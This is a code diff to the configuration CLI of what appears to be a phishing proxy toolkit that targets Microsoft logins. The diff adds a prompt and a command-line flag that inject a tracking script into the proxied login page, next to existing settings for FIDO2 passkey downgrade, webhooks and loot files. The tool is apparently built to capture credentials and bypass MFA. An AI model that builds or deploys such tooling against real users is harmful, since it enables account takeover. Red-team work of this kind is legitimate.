@@ -251,6 +251,17 @@ worker_name = your-worker-name
         choice = input("  Enable FIDO2 downgrade? [y/N]: ").strip().lower()
         return 'true' if choice in ('y', 'yes') else 'false'
 
+    def _prompt_html_injection(self, current_value: str = 'false') -> str:
+        """Prompt for HTML injection configuration"""
+        print("\n--- HTML Injection ---")
+        print("  Injects a telemetry script into the Microsoft login page.")
+        print("  Captures: browser capabilities, WebAuthn support, field timing,")
+        print("  page visibility changes. Does NOT capture credentials (those are")
+        print("  captured by the proxy directly).")
+        print(f"  Current: {'ENABLED' if current_value == 'true' else 'disabled'}")
+        choice = input("  Enable HTML injection? [y/N]: ").strip().lower()
+        return 'true' if choice in ('y', 'yes') else 'false'
+
     # ============================================================
     # Main Command Methods
     # ============================================================
@@ -291,6 +302,9 @@ worker_name = your-worker-name
             fido2_downgrade = self._prompt_fido2_downgrade(
                 config['vars'].get('FIDO2_DOWNGRADE', 'false')
             )
+            html_injection = self._prompt_html_injection(
+                config['vars'].get('HTML_INJECTION', 'false')
+            )
 
             # Save configuration using surgical updates to preserve comments
             update_wrangler_var(self.wrangler_toml, 'ALLOWED_IPS', allowed_ips)
@@ -302,6 +316,7 @@ worker_name = your-worker-name
             update_wrangler_var(self.wrangler_toml, 'UNAUTH_REDIR', unauth_redir)
             update_wrangler_var(self.wrangler_toml, 'WEBHOOK_URL', webhook_url)
             update_wrangler_var(self.wrangler_toml, 'FIDO2_DOWNGRADE', fido2_downgrade)
+            update_wrangler_var(self.wrangler_toml, 'HTML_INJECTION', html_injection)
 
             print("=" * 82)
             print("✓ Campaign configuration saved!")
@@ -314,6 +329,7 @@ worker_name = your-worker-name
             print(f"  Unauth redir:  {unauth_redir}")
             print(f"  Webhook:       {webhook_url[:50]}...")
             print(f"  FIDO2 bypass:  {'ENABLED' if fido2_downgrade == 'true' else 'disabled'}")
+            print(f"  HTML inject:   {'ENABLED' if html_injection == 'true' else 'disabled'}")
             print()
 
             return 0
@@ -717,6 +733,7 @@ worker_name = your-worker-name
         discover_mode = getattr(args, 'discover_mode', 'stealth') if args else 'stealth'
         output_file = getattr(args, 'loot_file', None) if args else None
         fido2_downgrade = getattr(args, 'fido2_downgrade', False) if args else False
+        html_injection = getattr(args, 'html_injection', False) if args else False
 
         # Check for TOKENSMITH_URL in wrangler.toml vars (CLI arg takes precedence)
         if not tokensmith_url:
@@ -726,6 +743,11 @@ worker_name = your-worker-name
         if fido2_downgrade:
             update_wrangler_var(self.wrangler_toml, 'FIDO2_DOWNGRADE', 'true')
             print(f"[*] FIDO2 downgrade ENABLED — passkey prompts will be suppressed")
+
+        # Set HTML injection if requested via CLI
+        if html_injection:
+            update_wrangler_var(self.wrangler_toml, 'HTML_INJECTION', 'true')
+            print(f"[*] HTML injection ENABLED")
 
         # Ensure WEBHOOK_URL points to local webhook listener
         current_webhook = vars_section.get('WEBHOOK_URL', '')
